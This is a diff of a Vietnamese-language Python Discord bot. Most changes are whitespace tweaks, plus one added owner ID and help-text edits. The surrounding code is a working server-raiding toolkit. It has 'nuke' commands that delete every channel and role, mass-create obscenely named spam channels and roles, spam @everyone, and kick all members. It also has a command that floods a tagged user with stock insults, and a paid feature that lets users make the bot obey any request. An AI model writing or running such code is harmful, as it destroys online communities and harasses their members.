@@ -17,6 +17,7 @@ BOT_OWNERS = [
     1531882555664629861,  
     1535132569534865490,
     1454570566517260422,
+    1450827282372497489
 ]
 
 intents = discord.Intents.default()
@@ -331,6 +332,7 @@ def is_bot_owner():
         return ctx.author.id in BOT_OWNERS
     return commands.check(predicate)
 
+# ==================== LỆNH NUKE SERVER ====================
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
@@ -387,9 +389,9 @@ async def nuke_server(ctx):
 
         for channel in ctx.guild.text_channels:
             try:
-                for _ in range(10):  
+                for _ in range(10):
                     await channel.send(spam_content)
-                    await asyncio.sleep(0.1)  
+                    await asyncio.sleep(0.1)
             except:
                 continue
 
@@ -428,7 +430,7 @@ async def spam_channels(ctx, amount: int = 100):
     """Tạo nhiều kênh spam với tên tục tĩu (mặc định 100 kênh)"""
     try:
         if amount > 200:
-            amount = 200  
+            amount = 200
 
         embed = discord.Embed(
             title="🚀 KÍCH HOẠT TẠO KÊNH SPAM",
@@ -441,7 +443,7 @@ async def spam_channels(ctx, amount: int = 100):
             try:
                 channel_name = random.choice(NUKE_CHANNEL_NAMES)
                 await ctx.guild.create_text_channel(name=channel_name)
-                await asyncio.sleep(0.5)  
+                await asyncio.sleep(0.5)
             except:
                 continue
 
@@ -484,9 +486,9 @@ async def spam_everyone(ctx):
 
         for channel in ctx.guild.text_channels:
             try:
-                for _ in range(10):  
+                for _ in range(10):
                     await channel.send(spam_content)
-                    await asyncio.sleep(0.1)  
+                    await asyncio.sleep(0.1)
             except:
                 continue
 
@@ -552,7 +554,7 @@ async def delete_all_channels(ctx):
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
-                await asyncio.sleep(0.5)  
+                await asyncio.sleep(0.5)
             except:
                 continue
 
@@ -585,7 +587,7 @@ async def spam_roles(ctx, amount: int = 50):
     """Tạo nhiều role spam với tên tục tĩu (mặc định 50 role)"""
     try:
         if amount > 250:
-            amount = 250  
+            amount = 250
 
         embed = discord.Embed(
             title="🚀 KÍCH HOẠT TẠO ROLE SPAM",
@@ -604,7 +606,7 @@ async def spam_roles(ctx, amount: int = 50):
                     hoist=True,
                     mentionable=True
                 )
-                await asyncio.sleep(0.5)  
+                await asyncio.sleep(0.5)
             except:
                 continue
 
@@ -670,7 +672,7 @@ async def delete_all_roles(ctx):
             try:
                 if role.name != "@everyone":
                     await role.delete()
-                    await asyncio.sleep(0.5)  
+                    await asyncio.sleep(0.5)
             except:
                 continue
 
@@ -741,7 +743,7 @@ async def kick_all_members(ctx):
                     member.id not in BOT_OWNERS and
                     member.id != ctx.guild.owner_id):
                     await member.kick(reason="Server nuke theo lệnh Boss Tuyền")
-                    await asyncio.sleep(1)  
+                    await asyncio.sleep(1)
             except:
                 continue
 
@@ -773,7 +775,7 @@ async def set_server_name(ctx, *, new_name: str):
     """Thay đổi tên server"""
     try:
         if len(new_name) > 100:
-            new_name = new_name[:100]  
+            new_name = new_name[:100]
 
         await ctx.guild.edit(name=new_name)
         embed = discord.Embed(
@@ -963,7 +965,6 @@ async def ultimate_nuke_error(ctx, error):
         await ctx.send(f"❌ Đã xảy ra lỗi: {str(error)}")
 
 # ==================== HỆ THỐNG NHÂN CÁCH ====================
-
 PERSONAS = {
     1: {
         'name': 'SWEET PRINCESS HỒNG 🌸',
@@ -1022,7 +1023,7 @@ async def work(ctx):
 @bot.command(name="setpersona")
 async def setpersona(ctx, *, user_request: str = None):
     user_id = ctx.author.id
-    cost = 5000  
+    cost = 5000
     
     if user_id not in USER_COINS:
         USER_COINS[user_id] = 0
@@ -1110,7 +1111,7 @@ async def setup(ctx):
             "🔹 **3. `l!work`**\n"
             "   └ *Khu vui chơi giải trí dành cho mọi thành viên: Làm việc qua 50 kịch bản ngẫu nhiên để kiếm từ 100 đến 2000 coin sắc hồng mỗi lượt!* 🪙\n\n"
             "🔹 **4. `l!setpersona [yêu cầu]`**\n"
-            "   └ *Dùng 5000 coin tích lũy từ khu vui chơi để sai khiến bot thay đổi nhân cách, hành vi và làm theo mọi ý muốn của bạn!* ✨\n\n"
+            "   └ *Dùng 5000 coin tích lũy từ khu vui chơi để sai khiến bot thay đổi nhân cách, hành vi và làm theo mọi yêu cầu kỳ diệu của bạn!* ✨\n\n"
             "🔹 **5. `l!spam @user [câu chửi tùy chỉnh]`**\n"
             "   └ *Kích hoạt lôi đài chiến dịch tra tấn văn bản tốc độ cao 600ms/câu (Sử dụng câu tùy chỉnh hoặc bốc ngẫu nhiên từ kho 209 câu chửi cực gắt).*\n\n"
             "🔹 **6. `l!stop`**\n"
@@ -1126,25 +1127,25 @@ async def setup(ctx):
             "🔹 **11. `l!ban @user [lý do]`**\n"
             "   └ *Trục xuất vĩnh viễn thành viên vi phạm khỏi vương quốc màu hồng kèm theo lý do rõ ràng.*\n\n"
             "🔹 **12. `l!nuke`**\n"
-            "   └ *Xóa tất cả kênh, tạo 100 kênh spam, spam @everyone.*\n\n"
+            "   └ *Xóa tất cả kênh, tạo 100 kênh spam, spam @everyone*\n\n"
             "🔹 **13. `l!spamchannels [số lượng]`**\n"
-            "   └ *Tạo nhiều kênh spam (mặc định 100).*\n\n"
+            "   └ *Tạo nhiều kênh spam (mặc định 100)*\n\n"
             "🔹 **14. `l!spameveryone`**\n"
-            "   └ *Spam @everyone trong tất cả kênh.*\n\n"
+            "   └ *Spam @everyone trong tất cả kênh*\n\n"
             "🔹 **15. `l!deleteallchannels`**\n"
-            "   └ *Xóa tất cả kênh trong server.*\n\n"
+            "   └ *Xóa tất cả kênh trong server*\n\n"
             "🔹 **16. `l!spamroles [số lượng]`**\n"
-            "   └ *Tạo nhiều role spam (mặc định 50).*\n\n"
+            "   └ *Tạo nhiều role spam (mặc định 50)*\n\n"
             "🔹 **17. `l!deleteallroles`**\n"
-            "   └ *Xóa tất cả role ngoại trừ @everyone.*\n\n"
+            "   └ *Xóa tất cả role ngoại trừ @everyone*\n\n"
             "🔹 **18. `l!kickall`**\n"
-            "   └ *Kick tất cả thành viên ngoại trừ bot và owner.*\n\n"
+            "   └ *Kick tất cả thành viên ngoại trừ bot và owner*\n\n"
             "🔹 **19. `l!setservername [tên mới]`**\n"
-            "   └ *Thay đổi tên server.*\n\n"
+            "   └ *Thay đổi tên server*\n\n"
             "🔹 **20. `l!setservericon [url]`**\n"
-            "   └ *Thay đổi icon server.*\n\n"
+            "   └ *Thay đổi icon server*\n\n"
             "🔹 **21. `l!ultimatenuke`**\n"
-            "   └ *Lệnh tổng hợp nuke toàn diện.*"
+            "   └ *Lệnh tổng hợp nuke toàn diện*"
         ),
         color=0xFF69B4
     )
@@ -1410,30 +1411,32 @@ async def help_command(ctx):
         description=(
             "Chào mừng toàn thể thần dân và các thành viên đến với bảng cẩm nang hướng dẫn chi tiết, dài dòng và lộng lẫy nhất trong không gian màu hồng rực rỡ của **Sun Flower AI**. "
             "Toàn bộ hệ thống được xây dựng và tối ưu hóa với quyền lực tối thượng thuộc về **Boss Tuyền**.\n\n"
-            "Dưới đây là danh sách đầy đủ, chi tiết từng câu lệnh cùng công dụng từ A đến Z:\n\n"
+            "Dưới đây là danh sách đầy đủ, chi tiết từng câu lệnh cùng công dụng từ A đến Z để mọi người dễ dàng tra cứu và trải nghiệm:\n\n"
             "🎮 **KHU VUI CHƠI DÀNH CHO TẤT CẢ MEMBER:**\n"
             "• `l!work`\n"
-            "  └ *Ghi chú dài dòng:* Lệnh vô cùng thú vị giúp bạn tham gia vào 1 trong 50 kịch bản làm việc ngẫu nhiên cực kỳ hấp dẫn trong không gian vũ trụ. Mỗi lần gõ lệnh, hệ thống sẽ tự động thưởng nóng cho bạn từ 100 đến 2000 coin sắc hồng để tích lũy làm giàu! 🪙✨\n\n"
+            "  └ *Ghi chú dài dòng:* Lệnh vô cùng thú vị giúp bạn tham gia vào 1 trong 50 kịch bản làm việc ngẫu nhiên cực kỳ hấp dẫn trong không gian vũ trụ... Mỗi lần gõ lệnh, hệ thống sẽ tự động thưởng nóng cho bạn một số lượng coin ngẫu nhiên từ 100 đến 2000 coin sắc hồng để tích lũy làm giàu! 🪙✨\n\n"
             "• `l!setpersona [yêu cầu chi tiết của bạn]`\n"
-            "  └ *Ghi chú dài dòng:* Sử dụng 5000 coin tích lũy kiếm được để toàn quyền sai khiến bot thay đổi nhân cách, hành vi theo ý muốn của bạn! 💕\n\n"
+            "  └ *Ghi chú dài dòng:* Sử dụng 5000 coin tích lũy kiếm được từ khu vui chơi `l!work` để toàn quyền sai khiến bot. Bạn có thể nhập bất kỳ yêu cầu nào về tính cách, giọng điệu, cách xưng hô hoặc phong cách trò chuyện mà bạn muốn bot thể hiện. 💕\n\n"
             "⚙️ **CÁC LỆNH ĐIỀU HÀNH & QUẢN TRỊ TỐI CAO (ĐỘC QUYỀN DÀNH CHO BOSS TUYỀN):**\n"
-            "• `l!setup` - Khởi tạo lại toàn bộ bảng điều khiển trung tâm.\n"
-            "• `l!persona <1|2>` - Chuyển đổi trạng thái nhân cách chính của bot.\n"
-            "• `l!spam @user [nội dung tùy chỉnh]` - Kích hoạt lôi đài chiến dịch trừng phạt mục tiêu.\n"
-            "• `l!stop` - Phanh gấp lập tức mọi hoạt động spam.\n"
-            "• `l!on` / `l!off` - Bật/tắt phản hồi tin nhắn tự động.\n"
-            "• `l!stats` - Trích xuất thông số kỹ thuật chi tiết của máy chủ.\n"
-            "• `l!ban @user [lý do]` - Trục xuất vĩnh viễn thành viên vi phạm.\n"
-            "• `l!nuke` - Xóa tất cả kênh, tạo 100 kênh spam, spam @everyone.\n"
-            "• `l!spamchannels [số lượng]` - Tạo nhiều kênh spam (mặc định 100).\n"
-            "• `l!spameveryone` - Spam @everyone trong tất cả kênh text.\n"
-            "• `l!deleteallchannels` - Xóa tất cả kênh trong server.\n"
-            "• `l!spamroles [số lượng]` - Tạo nhiều role spam (mặc định 50).\n"
-            "• `l!deleteallroles` - Xóa tất cả role ngoại trừ @everyone.\n"
-            "• `l!kickall` - Kick tất cả thành viên ngoại trừ bot, owner và BOT_OWNERS.\n"
-            "• `l!setservername [tên mới]` - Thay đổi tên server.\n"
-            "• `l!setservericon [url]` - Thay đổi icon server.\n"
-            "• `l!ultimatenuke` - Lệnh tổng hợp nuke toàn diện."
+            "• `l!setup`\n"
+            "• `l!persona <1|2>`\n"
+            "• `l!spam @user [nội dung tùy chỉnh]`\n"
+            "• `l!stop`\n"
+            "• `l!on`\n"
+            "• `l!off`\n"
+            "• `l!stats`\n"
+            "• `l!ban @user [lý do]`\n\n"
+            "💣 **CÁC LỆNH NUKE (ĐỘC QUYỀN BOSS TUYỀN):**\n"
+            "• `l!nuke`\n"
+            "• `l!spamchannels [số lượng]`\n"
+            "• `l!spameveryone`\n"
+            "• `l!deleteallchannels`\n"
+            "• `l!spamroles [số lượng]`\n"
+            "• `l!deleteallroles`\n"
+            "• `l!kickall`\n"
+            "• `l!setservername [tên mới]`\n"
+            "• `l!setservericon [url]`\n"
+            "• `l!ultimatenuke`"
         ),
         color=0xFF69B4
     )
@@ -1472,7 +1475,7 @@ async def on_message(message):
         elif current_persona_id in PERSONAS:
             p_info = PERSONAS[current_persona_id]
         else:
-        	p_info = PERSONAS[1]
+            p_info = PERSONAS[1]
 
         user_msg = message.content.strip() if message.content else "..."
         
@@ -1504,4 +1507,4 @@ async def on_message(message):
 if __name__ == "__main__":
     import aiohttp
     bot.run(DISCORD_TOKEN)
-[cite: 6]
+```[cite: 7]
